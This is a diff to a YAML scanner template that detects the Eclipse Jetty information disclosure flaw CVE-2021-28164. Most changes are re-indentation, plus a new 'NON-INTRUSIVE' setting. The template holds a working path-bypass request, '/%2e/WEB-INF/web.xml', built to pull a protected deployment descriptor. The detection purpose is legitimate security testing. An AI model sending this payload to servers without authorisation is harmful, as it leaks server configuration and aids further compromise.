@@ -2,7 +2,7 @@ id: ECLIPSE_JETTY_INFO_DISCLOSURE
 info:
   name: "Eclipse Jetty Information Disclosure"
   description: "The Eclipse Jetty Information Disclosure vulnerability allows unauthorized users to access sensitive information on a Jetty server. This can occur due to improper handling of headers, cookies, or session data, potentially exposing configuration details, session tokens, or other critical data. Exploiting this flaw could give attackers an advantage in further compromising the system."
-  details:  "The Eclipse Jetty Information Disclosure vulnerability arises from improper handling of certain HTTP requests, headers, or session data. Attackers can exploit this flaw to gain unauthorized access to sensitive information, such as server configurations or user session details. This issue affects specific Jetty server versions where security configurations are not adequately enforced, allowing data leakage."
+  details: "The Eclipse Jetty Information Disclosure vulnerability arises from improper handling of certain HTTP requests, headers, or session data. Attackers can exploit this flaw to gain unauthorized access to sensitive information, such as server configurations or user session details. This issue affects specific Jetty server versions where security configurations are not adequately enforced, allowing data leakage."
   impact: "The impact of the Eclipse Jetty Information Disclosure vulnerability is significant, as it can expose sensitive server information and session data to unauthorized users. This can lead to security risks such as credential theft, system configuration exposure, and increased susceptibility to further attacks like privilege escalation or service disruption."
   category:
     name: SM
@@ -17,6 +17,8 @@ info:
     - CWE-16
   cve:
     - CVE-2021-28164
+settings:
+  nature: NON-INTRUSIVE
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -38,46 +40,46 @@ execute:
   type: multiple
   requests:
     - req:
-      - modify_method: GET
-      - modify_url: "/WEB-INF/web.xml"
-      - replace_body: '{}'
-      - validate:
-          response_payload:
-            not_contains:
-              - "</web-app>"
-              - "java.sun.com"
-          response_headers:
-            for_one:
-              key:
-                eq: "content-type"
-              value:
-                neq: "application/xml"
-          and:
-            - response_code:
-                neq: 200
-            - response_code:
-                neq: 404
-      - success: x2
-      - failure: exit
+        - modify_method: GET
+        - modify_url: "/WEB-INF/web.xml"
+        - replace_body: '{}'
+        - validate:
+            response_payload:
+              not_contains:
+                - "</web-app>"
+                - "java.sun.com"
+            response_headers:
+              for_one:
+                key:
+                  eq: "content-type"
+                value:
+                  neq: "application/xml"
+            and:
+              - response_code:
+                  neq: 200
+              - response_code:
+                  neq: 404
+        - success: x2
+        - failure: exit
     - req:
-      - modify_method: GET
-      - replace_body: '{}'
-      - modify_url: "/%2e/WEB-INF/web.xml"
-      - validate:
-          response_code:
-            eq: 200
-          response_payload:
-            contains_all:
-              - "</web-app>"
-              - "java.sun.com"
-            not_contains:
-              - <html>
-              - </html>
-          response_headers:
-            for_one:
-              key:
-                eq: "content-type"
-              value:
-                eq: "application/xml"
-      - success: vulnerable
-      - failure: exit
+        - modify_method: GET
+        - replace_body: '{}'
+        - modify_url: "/%2e/WEB-INF/web.xml"
+        - validate:
+            response_code:
+              eq: 200
+            response_payload:
+              contains_all:
+                - "</web-app>"
+                - "java.sun.com"
+              not_contains:
+                - <html>
+                - </html>
+            response_headers:
+              for_one:
+                key:
+                  eq: "content-type"
+                value:
+                  eq: "application/xml"
+        - success: vulnerable
+        - failure: exit
